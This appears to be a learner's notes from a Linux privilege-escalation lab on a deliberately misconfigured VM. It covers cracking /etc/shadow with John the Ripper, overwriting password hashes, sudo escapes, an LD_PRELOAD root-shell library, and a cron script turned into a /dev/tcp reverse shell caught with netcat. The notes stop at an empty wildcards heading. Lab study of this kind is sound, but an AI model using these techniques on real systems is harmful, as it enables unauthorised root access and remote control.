# Linux PrivEsc

Linux Privilege Escalation skills on an intentionally mosconfigured Debian VM multiple ways to get root via SSH


## Service Exploit

I did not really get it but will be late explained in the room

## Weak File Permissions - Readable /etc/shadow

copied the shadow (Passwords enrypted in SHA-512crypt) and passwd file of the VM to my localhost and used unshadow to merge both files for bruteforce with john the ripper

> john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt

I got the password for root with this. 

## Weak File Permissions - Writable /etc/shadow

In the case where the shadow file can be written to, identifying the hash format in use is needed for privilege escalation.

mkpasswd -m sha-512 newpasswordhere

With the above command, a new password is created in a sha-512 format which we can copy and replace with the root hashed password in the shadow file.

Switching to the root user using the new password gives root access.

## Weak File Permissions - Writable /etc/passwd

Looking at the permissions of the /etc/passwd file, if it has been misconfigured, then we should be able to edit the passwd file and update it with a new passwd. 

Note: the password in the /etc/passwd file is hashed, so we need to edit the password with the right hash.

Using ```openssl passwd newpasswordhere```, we generate a password hash for the password newpasswordhere. you can feel free to use any password of your choice. 

Editting the passwd file with any editing tool like nano or vim, and place the password hash in between the first and second colon (:) of the root user's row (replacing the "x"). Neat.

## Sudo - Shell Escape Sequence

Using ```sudo -l```, we can discover the list of programs your user can run using sudo. [GTFOBins](https://gtfobins.github.io/) has listed programs which can be used to escape a shell to gain root access. 

Environment Variables

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

We compile the below C code using ```gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c```

Command breakdown
- gcc: The GNU Compiler Collection, a standard compiler for C and C++ language.
- fPIC: This flag tells the compiler to generate position-independent code, which is necessary for shared libraries.
- shared: This flag instructs the compiler to create a shared object rather than an executable.
- nostartfiles: This option prevents linking against the standard start files, which is suitable for shared libraries.
- o /tmp/preload.so: Specifies the output file name and location for the shared object, in this case, /tmp/preload.so.
/home/user/tools/sudo/preload.c: This is the input source file that contains the C code to be compiled

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

## Cron Jobs - File Permissions

Cron jobs are programs or script users schedule to run at specific time or intervals. 

Viewing the contents of the system crontab using ```cat /etc/crontab```, we can view the scheduled cron jobs and in this system, there is a bash script scheduled to run every minute. locating the script using ```locate overwrite.sh```, in order to modify the script. Before modifying the script, running ```ls -l /usr/local/bin/overwrite.sh``` command tells which user can edit it. If it is editable by the current user, then it should be modified with the below script

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

The IP address in the script should be changed to your current IP address that can be gotten through ifconfig command on linux & mac and ipconfig on windows. After modifying the script, we would open a netcat listener using the below command which would give us a root shell after a few minute.

```nc -nvlp 4444```

Note: the port (4444) should be the same for both your bash script on the target machine and the netcat listner on your local machine

## Cron Jobs - Wildcards
